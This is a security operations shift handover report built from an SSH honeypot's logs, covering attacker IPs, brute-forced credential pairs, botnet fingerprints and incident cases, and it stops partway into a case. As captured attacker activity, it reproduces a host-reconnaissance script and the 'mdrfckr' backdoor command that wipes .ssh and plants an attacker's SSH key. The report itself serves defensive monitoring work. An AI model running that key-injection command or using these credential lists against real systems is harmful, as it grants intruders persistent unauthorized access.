# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-06 |
| **Generated At** | 2026-07-06T20:03:57Z |
| **Shift Time** | 20:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **460** |
| Confirmed Threats | **456** |
| False Positives Filtered | **4** (0.9%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **24** |
| High Severity Cases | **196** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **264** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **252** |
| Unique Credential Pairs | **149** |
| Unique Usernames | **30** |
| Unique Passwords | **105** |
| Successful Auth Pairs | **206** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 75 |
| `345gs5662d34` | 42 |
| `user` | 30 |
| `hadoop` | 27 |
| `support` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 42 |
| `3245gs5662d34` | 42 |
| `support` | 18 |
| `admin` | 6 |
| `LeitboGi0ro` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 42 |
| `root` | `3245gs5662d34` | 25 |
| `support` | `support` | 18 |
| `admin` | `admin` | 6 |
| `root` | `LeitboGi0ro` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin!12345` | `10.0.0.73` | 2026-07-06T14:55:16 |
| `user` | `654321` | `91.92.40.176` | 2026-07-06T14:55:19 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-06T14:55:19 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T14:55:19 |
| `support` | `support` | `176.53.159.196` | 2026-07-06T14:56:44 |
| `support` | `support` | `10.0.0.73` | 2026-07-06T14:56:57 |
| `user` | `123` | `91.92.40.176` | 2026-07-06T14:57:32 |
| `user` | `321` | `91.92.40.176` | 2026-07-06T14:59:52 |
| `admin` | `admin.2024` | `10.0.0.73` | 2026-07-06T14:59:58 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T15:00:08 |
| `root` | `20100728` | `45.198.224.120` | 2026-07-06T15:00:46 |
| `user` | `test` | `91.92.40.176` | 2026-07-06T15:01:36 |
| `user` | `test123` | `91.92.40.176` | 2026-07-06T15:03:31 |
| `root` | `root@3000` | `2.58.172.185` | 2026-07-06T15:04:25 |
| `user` | `test321` | `91.92.40.176` | 2026-07-06T15:05:38 |
| `user` | `password` | `91.92.40.176` | 2026-07-06T15:07:45 |
| `admin` | `admin` | `185.70.109.79` | 2026-07-06T15:08:21 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-06T15:08:23 |
| `user` | `passwd` | `91.92.40.176` | 2026-07-06T15:09:10 |
| `user` | `pass` | `91.92.40.176` | 2026-07-06T15:10:43 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-06T15:11:58 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-06T15:11:58 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-06T15:12:01 |
| `user` | `P@ssw0rd` | `91.92.40.176` | 2026-07-06T15:12:11 |
| `students` | `students` | `45.198.224.120` | 2026-07-06T15:12:35 |
| `user` | `qwe123` | `91.92.40.176` | 2026-07-06T15:13:43 |
| `user` | `qwer1234` | `91.92.40.176` | 2026-07-06T15:15:16 |
| `user` | `password123` | `91.92.40.176` | 2026-07-06T15:16:48 |
| `root` | `samson` | `96.78.175.36` | 2026-07-06T15:17:47 |
| `345gs5662d34` | `345gs5662d34` | `96.78.175.36` | 2026-07-06T15:17:49 |
| `root` | `3245gs5662d34` | `96.78.175.36` | 2026-07-06T15:17:50 |
| `user` | `qwerty123456` | `91.92.40.176` | 2026-07-06T15:19:24 |
| `user` | `1234qwer` | `91.92.40.176` | 2026-07-06T15:20:54 |
| `user` | `123qwe` | `91.92.40.176` | 2026-07-06T15:22:26 |
| `user` | `passpass` | `91.92.40.176` | 2026-07-06T15:23:59 |
| `ubuntu` | `qwer1234!@#$` | `45.198.224.120` | 2026-07-06T15:24:15 |
| `user` | `pass123` | `91.92.40.176` | 2026-07-06T15:25:30 |
| `user` | `pass1234` | `91.92.40.176` | 2026-07-06T15:27:06 |
| `admin` | `admin` | `125.20.210.182` | 2026-07-06T15:27:48 |
| `user` | `wasd` | `91.92.40.176` | 2026-07-06T15:28:34 |
| `user` | `qwerty` | `91.92.40.176` | 2026-07-06T15:30:02 |
| `user` | `q1w2e3` | `91.92.40.176` | 2026-07-06T15:31:28 |
| `user` | `q1w2e3r4` | `91.92.40.176` | 2026-07-06T15:32:53 |
| `ubuntu` | `abcd12` | `185.242.3.195` | 2026-07-06T15:33:27 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-06T15:33:28 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-06T15:33:28 |
| `user` | `1q2w3e` | `91.92.40.176` | 2026-07-06T15:34:22 |
| `user` | `1q2w3e4r` | `91.92.40.176` | 2026-07-06T15:35:49 |
| `root` | `qaz123` | `45.198.224.120` | 2026-07-06T15:35:58 |
| `user` | `111111` | `91.92.40.176` | 2026-07-06T15:37:14 |
| `user` | `qwerty123` | `91.92.40.176` | 2026-07-06T15:38:24 |
| `user` | `123321` | `91.92.40.176` | 2026-07-06T15:39:36 |
| `user` | `321123` | `91.92.40.176` | 2026-07-06T15:40:47 |
| `user` | `p@ssw0rd` | `91.92.40.176` | 2026-07-06T15:41:59 |
| `hadoop` | `123456` | `91.92.40.176` | 2026-07-06T15:43:09 |
| `hadoop` | `654321` | `91.92.40.176` | 2026-07-06T15:44:21 |
| `hadoop` | `123` | `91.92.40.176` | 2026-07-06T15:45:31 |
| `hadoop` | `321` | `91.92.40.176` | 2026-07-06T15:46:47 |
| `yuanzhe` | `yuanzhe` | `45.198.224.120` | 2026-07-06T15:47:39 |
| `hadoop` | `test` | `91.92.40.176` | 2026-07-06T15:47:55 |
| `hadoop` | `test123` | `91.92.40.176` | 2026-07-06T15:49:10 |
| `hadoop` | `test321` | `91.92.40.176` | 2026-07-06T15:50:18 |
| `hadoop` | `password` | `91.92.40.176` | 2026-07-06T15:51:33 |
| `hadoop` | `passwd` | `91.92.40.176` | 2026-07-06T15:52:43 |
| `hadoop` | `pass` | `91.92.40.176` | 2026-07-06T15:53:51 |
| `hadoop` | `P@ssw0rd` | `91.92.40.176` | 2026-07-06T15:54:58 |
| `hadoop` | `qwe123` | `91.92.40.176` | 2026-07-06T15:56:07 |
| `hadoop` | `qwer1234` | `91.92.40.176` | 2026-07-06T15:57:26 |
| `hadoop` | `password123` | `91.92.40.176` | 2026-07-06T15:58:29 |
| `ubuntu` | `asdf1234567` | `45.198.224.120` | 2026-07-06T15:59:07 |
| `hadoop` | `qwerty123456` | `91.92.40.176` | 2026-07-06T15:59:43 |
| `hadoop` | `1234qwer` | `91.92.40.176` | 2026-07-06T16:00:50 |
| `hadoop` | `123qwe` | `91.92.40.176` | 2026-07-06T16:01:59 |
| `hadoop` | `passpass` | `91.92.40.176` | 2026-07-06T16:03:08 |
| `hadoop` | `pass123` | `91.92.40.176` | 2026-07-06T16:04:25 |
| `test` | `P@$$w0rd@123` | `118.193.45.134` | 2026-07-06T16:04:52 |
| `345gs5662d34` | `345gs5662d34` | `118.193.45.134` | 2026-07-06T16:04:56 |
| `test` | `3245gs5662d34` | `118.193.45.134` | 2026-07-06T16:04:57 |
| `hadoop` | `pass1234` | `91.92.40.176` | 2026-07-06T16:05:34 |
| `hadoop` | `wasd` | `91.92.40.176` | 2026-07-06T16:06:44 |
| `root` | `Temp123!` | `10.0.0.73` | 2026-07-06T16:06:56 |
| `hadoop` | `qwerty` | `91.92.40.176` | 2026-07-06T16:07:52 |
| `hadoop` | `q1w2e3` | `91.92.40.176` | 2026-07-06T16:09:00 |
| `root` | `qwe123` | `118.194.228.101` | 2026-07-06T16:09:44 |
| `345gs5662d34` | `345gs5662d34` | `118.194.228.101` | 2026-07-06T16:09:47 |
| `root` | `3245gs5662d34` | `118.194.228.101` | 2026-07-06T16:09:49 |
| `devops` | `12345` | `10.0.0.73` | 2026-07-06T16:09:52 |
| `devops` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T16:09:55 |
| `hadoop` | `q1w2e3r4` | `91.92.40.176` | 2026-07-06T16:10:12 |
| `root` | `matthew` | `45.198.224.120` | 2026-07-06T16:10:38 |
| `root` | `Mq123456` | `10.0.0.73` | 2026-07-06T16:10:57 |
| `hadoop` | `1q2w3e` | `91.92.40.176` | 2026-07-06T16:11:17 |
| `root` | `escorpion` | `104.218.166.62` | 2026-07-06T16:11:21 |
| `345gs5662d34` | `345gs5662d34` | `104.218.166.62` | 2026-07-06T16:11:26 |
| `root` | `3245gs5662d34` | `104.218.166.62` | 2026-07-06T16:11:28 |
| `root` | `1qwertyuiop` | `10.0.0.73` | 2026-07-06T16:12:24 |
| `hadoop` | `1q2w3e4r` | `91.92.40.176` | 2026-07-06T16:12:27 |
| `oracle` | `1qaz!QAZ` | `31.56.178.132` | 2026-07-06T16:13:28 |
| `345gs5662d34` | `345gs5662d34` | `31.56.178.132` | 2026-07-06T16:13:29 |
| `oracle` | `3245gs5662d34` | `31.56.178.132` | 2026-07-06T16:13:30 |
| `hadoop` | `111111` | `91.92.40.176` | 2026-07-06T16:13:37 |
| `ubuntu` | `abcd12` | `10.0.0.73` | 2026-07-06T16:14:15 |
| `admin` | `admin` | `103.253.245.232` | 2026-07-06T16:14:40 |
| `root` | `123asdqwe` | `172.184.241.11` | 2026-07-06T16:14:51 |
| `345gs5662d34` | `345gs5662d34` | `172.184.241.11` | 2026-07-06T16:14:53 |
| `root` | `3245gs5662d34` | `172.184.241.11` | 2026-07-06T16:14:54 |
| `oracle` | `1qaz!QAZ` | `180.247.179.206` | 2026-07-06T16:15:31 |
| `345gs5662d34` | `345gs5662d34` | `180.247.179.206` | 2026-07-06T16:15:35 |
| `oracle` | `3245gs5662d34` | `180.247.179.206` | 2026-07-06T16:15:37 |
| `root` | `Bruce@123` | `113.171.81.144` | 2026-07-06T16:17:02 |
| `345gs5662d34` | `345gs5662d34` | `113.171.81.144` | 2026-07-06T16:17:08 |
| `root` | `3245gs5662d34` | `113.171.81.144` | 2026-07-06T16:17:10 |
| `root` | `denston` | `103.155.47.50` | 2026-07-06T16:17:29 |
| `345gs5662d34` | `345gs5662d34` | `103.155.47.50` | 2026-07-06T16:17:33 |
| `root` | `3245gs5662d34` | `103.155.47.50` | 2026-07-06T16:17:34 |
| `root` | `Pp123456` | `36.37.73.242` | 2026-07-06T16:21:42 |
| `345gs5662d34` | `345gs5662d34` | `36.37.73.242` | 2026-07-06T16:21:46 |
| `root` | `3245gs5662d34` | `36.37.73.242` | 2026-07-06T16:21:48 |
| `centos` | `root` | `45.198.224.120` | 2026-07-06T16:22:04 |
| `root` | `2468` | `14.103.103.211` | 2026-07-06T16:23:48 |
| `345gs5662d34` | `345gs5662d34` | `14.103.103.211` | 2026-07-06T16:23:56 |
| `root` | `3245gs5662d34` | `14.103.103.211` | 2026-07-06T16:24:07 |
| `centos` | `Huawei12#$` | `14.63.217.28` | 2026-07-06T16:27:21 |
| `345gs5662d34` | `345gs5662d34` | `14.63.217.28` | 2026-07-06T16:27:25 |
| `centos` | `3245gs5662d34` | `14.63.217.28` | 2026-07-06T16:27:26 |
| `root` | `L1nuxAdmin#Secure` | `45.198.224.120` | 2026-07-06T16:33:52 |
| `root` | `informations` | `45.198.224.120` | 2026-07-06T16:46:01 |
| `mysql` | `mysql123` | `45.198.224.120` | 2026-07-06T16:58:04 |
| `demo` | `demo@123` | `10.0.0.73` | 2026-07-06T17:02:11 |
| `demo` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T17:02:16 |
| `yangliusha10` | `yangliusha10` | `185.242.3.195` | 2026-07-06T17:06:01 |
| `ubuntu` | `12344321` | `45.198.224.120` | 2026-07-06T17:10:18 |
| `root` | `Root@123!@#` | `10.0.0.73` | 2026-07-06T17:10:23 |
| `ubuntu` | `!qaz2wsx` | `10.0.0.73` | 2026-07-06T17:11:31 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-06T17:11:37 |
| `root` | `1987813` | `103.59.163.132` | 2026-07-06T17:12:06 |
| `345gs5662d34` | `345gs5662d34` | `103.59.163.132` | 2026-07-06T17:12:10 |
| `root` | `3245gs5662d34` | `103.59.163.132` | 2026-07-06T17:12:12 |
| `bitrix` | `1qaz2wsx` | `61.223.65.26` | 2026-07-06T17:14:03 |
| `345gs5662d34` | `345gs5662d34` | `61.223.65.26` | 2026-07-06T17:14:06 |
| `bitrix` | `3245gs5662d34` | `61.223.65.26` | 2026-07-06T17:14:08 |
| `root` | `Cy123456` | `10.0.0.73` | 2026-07-06T17:15:27 |
| `git` | `M3gaP33!` | `212.154.234.9` | 2026-07-06T17:15:41 |
| `345gs5662d34` | `345gs5662d34` | `212.154.234.9` | 2026-07-06T17:15:45 |
| `git` | `3245gs5662d34` | `212.154.234.9` | 2026-07-06T17:15:46 |
| `admin` | `admin` | `124.221.185.179` | 2026-07-06T17:15:50 |
| `root` | `laopo5201314` | `200.141.47.190` | 2026-07-06T17:21:28 |
| `345gs5662d34` | `345gs5662d34` | `200.141.47.190` | 2026-07-06T17:21:31 |
| `root` | `3245gs5662d34` | `200.141.47.190` | 2026-07-06T17:21:31 |
| `root` | `torr1ent` | `45.198.224.120` | 2026-07-06T17:22:30 |
| `root` | `skyler` | `182.93.7.194` | 2026-07-06T17:24:28 |
| `345gs5662d34` | `345gs5662d34` | `182.93.7.194` | 2026-07-06T17:24:32 |
| `root` | `3245gs5662d34` | `182.93.7.194` | 2026-07-06T17:24:34 |
| `root` | `1qaz2WSX3EDC` | `10.0.0.73` | 2026-07-06T17:26:23 |
| `root` | `Pml123456` | `10.0.0.73` | 2026-07-06T17:28:22 |
| `root` | `jeannie` | `153.0.158.120` | 2026-07-06T17:28:44 |
| `345gs5662d34` | `345gs5662d34` | `153.0.158.120` | 2026-07-06T17:28:48 |
| `root` | `3245gs5662d34` | `153.0.158.120` | 2026-07-06T17:28:50 |
| `svn` | `svn` | `139.59.59.165` | 2026-07-06T17:29:23 |
| `345gs5662d34` | `345gs5662d34` | `139.59.59.165` | 2026-07-06T17:29:27 |
| `svn` | `3245gs5662d34` | `139.59.59.165` | 2026-07-06T17:29:28 |
| `root` | `jiang123` | `10.0.0.73` | 2026-07-06T17:30:12 |
| `root` | `1234512345` | `2.58.172.185` | 2026-07-06T17:31:05 |
| `ftp2` | `ftp2` | `197.5.145.114` | 2026-07-06T17:32:46 |
| `345gs5662d34` | `345gs5662d34` | `197.5.145.114` | 2026-07-06T17:32:49 |
| `ftp2` | `3245gs5662d34` | `197.5.145.114` | 2026-07-06T17:32:50 |
| `root` | `Zxc123456789` | `10.0.0.73` | 2026-07-06T17:33:23 |
| `root` | `Pass@word12#$` | `45.198.224.120` | 2026-07-06T17:34:45 |
| `test` | `1` | `103.154.62.14` | 2026-07-06T17:37:25 |
| `345gs5662d34` | `345gs5662d34` | `103.154.62.14` | 2026-07-06T17:37:30 |
| `test` | `3245gs5662d34` | `103.154.62.14` | 2026-07-06T17:37:31 |
| `daniel` | `daniel2024` | `180.184.84.77` | 2026-07-06T17:38:39 |
| `345gs5662d34` | `345gs5662d34` | `180.184.84.77` | 2026-07-06T17:38:43 |
| `daniel` | `3245gs5662d34` | `180.184.84.77` | 2026-07-06T17:38:45 |
| `admin` | `P@ssw0rd@2022` | `10.0.0.73` | 2026-07-06T17:42:54 |
| `yangliusha10` | `yangliusha10` | `10.0.0.73` | 2026-07-06T17:46:24 |
| `root` | `Rahul@12345678` | `45.198.224.120` | 2026-07-06T17:46:31 |
| `root` | `adminpass` | `10.0.0.73` | 2026-07-06T17:55:00 |
| `GET / HTTP/1.0` | `` | `46.101.229.179` | 2026-07-06T17:57:37 |
| `OPTIONS / HTTP/1.0` | `` | `46.101.229.179` | 2026-07-06T17:57:42 |
| `OPTIONS / RTSP/1.0` | `` | `46.101.229.179` | 2026-07-06T17:57:47 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `46.101.229.179` | 2026-07-06T17:58:26 |
| `user3` | `user3` | `45.198.224.120` | 2026-07-06T17:58:36 |
| `root` | `Passw0rd44` | `45.198.224.120` | 2026-07-06T18:10:59 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-06T18:14:16 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-06T18:14:17 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-06T18:14:19 |
| `minecraft` | `minecraft` | `45.198.224.120` | 2026-07-06T18:23:14 |
| `root` | `Root.123` | `45.198.224.120` | 2026-07-06T18:35:33 |
| `bingquanye` | `bingquanye` | `185.242.3.195` | 2026-07-06T18:37:36 |
| `testssh` | `123456` | `186.147.162.215` | 2026-07-06T18:39:58 |
| `345gs5662d34` | `345gs5662d34` | `186.147.162.215` | 2026-07-06T18:40:01 |
| `testssh` | `3245gs5662d34` | `186.147.162.215` | 2026-07-06T18:40:01 |
| `root` | `12356789` | `144.31.156.154` | 2026-07-06T18:40:18 |
| `345gs5662d34` | `345gs5662d34` | `144.31.156.154` | 2026-07-06T18:40:22 |
| `root` | `3245gs5662d34` | `144.31.156.154` | 2026-07-06T18:40:23 |
| `root` | `Centos2025` | `103.97.101.25` | 2026-07-06T18:46:45 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-06T18:46:49 |
| `root` | `3245gs5662d34` | `103.97.101.25` | 2026-07-06T18:46:51 |
| `root` | `qawzse` | `45.198.224.120` | 2026-07-06T18:47:50 |
| `root` | `21ops.com` | `71.27.86.44` | 2026-07-06T18:50:19 |
| `345gs5662d34` | `345gs5662d34` | `71.27.86.44` | 2026-07-06T18:50:21 |
| `root` | `3245gs5662d34` | `71.27.86.44` | 2026-07-06T18:50:21 |
| `sftpadmin` | `sftpadmin123` | `165.154.254.143` | 2026-07-06T18:52:54 |
| `345gs5662d34` | `345gs5662d34` | `165.154.254.143` | 2026-07-06T18:52:56 |
| `sftpadmin` | `3245gs5662d34` | `165.154.254.143` | 2026-07-06T18:52:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **460** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 99 |
| libssh | 98 |
| Paramiko (Python) | 11 |
| Unknown | 1 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 72 | 24 |
| `2ec37a7cc8da...` | Mirai/variant | 58 | 1 |
| `16443846184e...` | Generic scanner | 27 | 3 |
| `a2de0f306611...` | Mirai/variant | 11 | 3 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 72 | 24 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 58 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 27 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 14 | 6 | — |
| `a2de0f306611...` | Paramiko (Python) | 11 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 6 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 57 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 27 | 27 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.5.145.114`, `153.0.158.120`, `61.223.65.26`, `182.93.7.194`, `103.155.47.50`, `31.56.178.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **51** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS21859` | Zenlayer Inc | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (196)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b358bdbe7374

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:55 |
| **Last Seen** | 2026-07-06 14:55 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:55:05` | `cowrie.client.version` |
| `2026-07-06 14:55:05` | `cowrie.client.kex` |
| `2026-07-06 14:55:19` | `cowrie.login.success` |
| `2026-07-06 14:55:22` | `cowrie.session.params` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.success` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:22` | `cowrie.command.input` |
| `2026-07-06 14:55:24` | `cowrie.log.closed` |
| `2026-07-06 14:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed53940e4a67

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 14:56 |
| **Last Seen** | 2026-07-06 14:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:56:43` | `cowrie.session.connect` |
| `2026-07-06 14:56:43` | `cowrie.client.version` |
| `2026-07-06 14:56:43` | `cowrie.client.kex` |
| `2026-07-06 14:56:44` | `cowrie.login.success` |
| `2026-07-06 14:56:44` | `cowrie.direct-tcpip.request` |
| `2026-07-06 14:56:44` | `cowrie.direct-tcpip.data` |
| `2026-07-06 14:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814284725f64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:57 |
| **Last Seen** | 2026-07-06 14:57 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:57:11` | `cowrie.session.connect` |
| `2026-07-06 14:57:15` | `cowrie.client.version` |
| `2026-07-06 14:57:15` | `cowrie.client.kex` |
| `2026-07-06 14:57:32` | `cowrie.login.success` |
| `2026-07-06 14:57:39` | `cowrie.session.params` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.success` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:39` | `cowrie.command.input` |
| `2026-07-06 14:57:40` | `cowrie.log.closed` |
| `2026-07-06 14:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf8d7328fce

| Field | Detail |
|---|---|
